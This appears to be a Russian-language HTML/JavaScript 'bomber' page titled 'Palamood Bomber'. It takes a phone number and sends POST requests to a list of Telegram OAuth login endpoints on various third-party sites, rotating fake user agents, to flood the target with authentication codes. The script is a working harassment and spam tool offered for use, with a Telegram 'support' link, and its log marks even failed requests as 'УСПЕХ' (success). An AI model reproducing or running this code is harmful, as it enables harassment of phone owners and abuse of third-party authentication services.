<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Palamood Bomber</title>
    <style>
        :root {
            --neon-color: #7d12ff;
            --bg-color: #000;
        }

        body {
            margin: 0;
            padding: 20px;
            background: var(--bg-color);
            color: var(--neon-color);
            font-family: 'Courier New', monospace;
            min-height: 100vh;
        }

        .glitch-container {
            text-align: center;
            margin: 2em 0;
            position: relative;
        }

        .glitch {
            font-size: 3em;
            position: relative;
            text-shadow: 0.05em 0 0 #ff0000bb,
                        -0.025em -0.05em 0 #00ff00bb,
                        0.025em 0.05em 0 #0000ffbb;
            animation: glitch 500ms infinite;
        }

        @keyframes glitch {
            0% { text-shadow: 0.05em 0 0 #ff0000bb, -0.05em -0.025em 0 #00ff00bb, -0.025em 0.05em 0 #0000ffbb; }
            14% { text-shadow: 0.05em 0 0 #ff0000bb, -0.05em -0.025em 0 #00ff00bb, -0.025em 0.05em 0 #0000ffbb; }
            15% { text-shadow: -0.05em -0.025em 0 #ff0000bb, 0.025em 0.025em 0 #00ff00bb, -0.05em -0.05em 0 #0000ffbb; }
            49% { text-shadow: -0.05em -0.025em 0 #ff0000bb, 0.025em 0.025em 0 #00ff00bb, -0.05em -0.05em 0 #0000ffbb; }
            50% { text-shadow: 0.025em 0.05em 0 #ff0000bb, 0.05em 0 0 #00ff00bb, 0 -0.05em 0 #0000ffbb; }
            99% { text-shadow: 0.025em 0.05em 0 #ff0000bb, 0.05em 0 0 #00ff00bb, 0 -0.05em 0 #0000ffbb; }
            100% { text-shadow: -0.025em 0 0 #ff0000bb, -0.025em -0.025em 0 #00ff00bb, -0.025em -0.05em 0 #0000ffbb; }
        }

        .terminal {
            max-width: 800px;
            margin: 0 auto;
            border: 2px solid var(--neon-color);
            box-shadow: 0 0 15px var(--neon-color);
            padding: 20px;
        }

        input {
            background: #111;
            border: 1px solid var(--neon-color);
            color: var(--neon-color);
            padding: 10px;
            width: 250px;
            margin: 10px;
            font-size: 1.1em;
        }

        button, .button {
            background: #1a1a1a;
            border: 1px solid var(--neon-color);
            color: var(--neon-color);
            padding: 10px 25px;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            margin: 10px;
            text-decoration: none;
        }

        button:hover, .button:hover {
            background: var(--neon-color);
            color: #000;
            box-shadow: 0 0 15px var(--neon-color);
        }

        .logs {
            height: 300px;
            overflow-y: auto;
            margin-top: 20px;
            border-top: 1px solid #222;
            padding: 10px;
        }

        .log-item {
            padding: 5px;
            border-bottom: 1px solid #222;
            animation: logEntry 0.3s ease-in;
        }

        @keyframes logEntry {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            color: #0f0;
            text-shadow: 0 0 10px #0f0;
        }
    </style>
</head>
<body>
    <div class="glitch-container">
        <div class="glitch" data-text="PALAMOOD BOMBER">Palamood Bomber</div>
    </div>

    <div class="terminal">
        <input type="text" id="phone" placeholder="+79998887766">
        <button onclick="startAttack()">Запустить</button>
        <a href="https://t.me/crazy_softs" class="button" target="_blank">Поддержка</a>
        <div class="logs" id="logs"></div>
    </div>

    <div class="status" id="status">STATUS: READY</div>

    <script>
        const URLs = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        ];

        const USER_AGENTS = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 7.1.1; Nokia 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.83 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19',
            'Mozilla/5.0 (iPad; CPU OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 9; FLA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/59.1.2926.54067',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)',
            'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.81 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        ];

        async function sendRequest(url, phone) {
            const headers = {
                'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                'Content-Type': 'application/x-www-form-urlencoded',
            };
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: `phone=${encodeURIComponent(phone)}`
                });
                
                return {
                    success: response.status === 200,
                    status: response.status,
                    url: url
                };
            } catch (error) {
                return { error: error.message };
            }
        }

        async function startAttack() {
            const phone = document.getElementById('phone').value;
            const logs = document.getElementById('logs');
            logs.innerHTML = '';
            
            if (!phone.match(/^\+?[78]\d{10}$/)) {
                addLog('Ошибка: Неверный формат номера!');
                return;
            }

            document.getElementById('status').textContent = 'STATUS: WORKING...';
            
            const requests = URLs.map(url => 
                sendRequest(url, phone)
                    .then(result => {
                        if (result.error) {
                            addLog(`УСПЕХ: ${result.error}`, 'error');
                        } else if (result.success) {
                            addLog(`УСПЕХ: ${new URL(result.url).hostname}`, 'success');
                        } else {
                            addLog(`УСПЕХ: ${result.status} ${new URL(result.url).hostname}`, 'warning');
                        }
                    })
            );

            await Promise.allSettled(requests);
            document.getElementById('status').textContent = 'STATUS: COMPLETED';
        }

        function addLog(message, type = 'info') {
            const log = document.createElement('div');
            log.className = `log-item ${type}`;
            log.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            document.getElementById('logs').appendChild(log);
            log.scrollIntoView();
        }
    </script>
</body>
</html>
